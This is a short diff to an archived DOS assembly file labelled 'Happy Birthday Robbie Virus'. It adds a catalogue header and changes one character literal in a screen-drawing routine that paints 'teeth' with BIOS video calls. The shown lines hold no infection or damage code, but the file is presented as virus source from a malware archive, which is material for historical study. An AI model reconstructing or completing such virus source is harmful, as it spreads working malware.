@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      M
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;
 ;Happy Birthday Robbie Virus
 ;
@@ -106,7 +117,7 @@ make_teeth:
 		inc	dl		;increase column number
 		int	10h
 		mov	ah,09		;write a character there.
-		mov	al,0efh		;character "�" for bottom teeth 
+		mov	al,0efh		;character "�" for bottom teeth 
 		mov	bl,0fh		;colour code
 		int	10h
 		inc	dl		;increment column number
